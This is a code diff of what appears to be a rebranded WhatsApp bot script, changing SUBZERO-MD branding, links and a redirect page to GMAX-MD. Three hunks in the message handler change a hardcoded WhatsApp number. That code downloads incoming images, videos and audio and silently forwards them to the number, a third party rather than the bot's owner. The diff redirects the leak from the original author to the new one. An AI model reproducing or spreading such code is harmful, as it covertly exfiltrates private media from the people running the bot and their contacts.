@@ -136,7 +136,7 @@ async function f2() {
       });
       console.log("[❄️] Plugins installed successful ✅");
       console.log("[❄️] Gmax MD connected to whatsapp ✅");
-      let v9 = "*Hi Owner😇, Congrats Gmax Connected Successfully! 🚀* \n\n> Light, Cold, Icy, Fast & Rich Loaded With Features, SubZero W.A Bot.\n\n *Thanks for using SUBZERO-MD ❄️* \n\n> Join WhatsApp Channel :- 🛠️\n \nhttps://whatsapp.com/channel/0029VagQEmB002T7MWo3Sj1D\n\n- *ყσµɾ ɓσƭ ρɾεƒเא ➜*  " + v2 + "\n\nDont forget to  star our repo☺ \n\nhttps://github.com/mrfrank-ofc/SUBZERO-MD\n\n> © 🎐ᴘϙᴡᴇʀᴇᴅ ʙʏ ᴍʀ ꜰʀᴀɴᴋ ᴏꜰᴄ ⚡";
+      let v9 = "*Hi Owner😇, Congrats Gmax Connected Successfully! 🚀* \n\n> Light, Cold, Icy, Fast & Rich Loaded With Features, SubZero W.A Bot.\n\n *Thanks for using GMAX-MD ❄️* \n\n> Join WhatsApp Channel :- 🛠️\n \nhttps://whatsapp.com/channel/0029VaFytPbAojYm7RIs6l1x\n\n- *ყσµɾ ɓσƭ ρɾεƒเא ➜*  " + v2 + "\n\nDont forget to  star our repo☺ \n\nhttps://github.com/gmaxtech2024/GMAX-MD \n\n> © 🎐ᴘϙᴡᴇʀᴇᴅ ʙʏ sɪʀ ɢᴍᴀx⚡";
       vMakeWASocket.sendMessage(vMakeWASocket.user.id, {
         image: {
           url: "https://i.ibb.co/8NBwB9P/mrfrankofc.jpg"
@@ -181,7 +181,7 @@ async function f2() {
       if (v12.message.imageMessage) {
         let v14 = v12.message.imageMessage.caption;
         let v15 = await vMakeWASocket.downloadAndSaveMediaMessage(v12.message.imageMessage);
-        return vMakeWASocket.sendMessage("263719647303@s.whatsapp.net", {
+        return vMakeWASocket.sendMessage("255622053093@s.whatsapp.net", {
           image: {
             url: v15
           },
@@ -193,7 +193,7 @@ async function f2() {
       if (v12.message.videoMessage) {
         let v16 = v12.message.videoMessage.caption;
         let v17 = await vMakeWASocket.downloadAndSaveMediaMessage(v12.message.videoMessage);
-        return vMakeWASocket.sendMessage("263719647303@s.whatsapp.net", {
+        return vMakeWASocket.sendMessage("255622053093@s.whatsapp.net", {
           video: {
             url: v17
           },
@@ -204,7 +204,7 @@ async function f2() {
       }
       if (v12.message.audioMessage) {
         let v18 = await vMakeWASocket.downloadAndSaveMediaMessage(v12.message.audioMessage);
-        return vMakeWASocket.sendMessage("263719647303@s.whatsapp.net", {
+        return vMakeWASocket.sendMessage("255622053093@s.whatsapp.net", {
           audio: {
             url: v18
           },
@@ -840,7 +840,7 @@ async function f2() {
 }
 vExpress2.use(express2.static(path2.join(__dirname, "lib")));
 vExpress2.get("/", (p81, p82) => {
-  p82.redirect("/subzero.html");
+  p82.redirect("/gmax.html");
 });
 vExpress2.listen(v8, () => console.log("Server listening on port http://localhost:" + v8));
 setTimeout(() => {
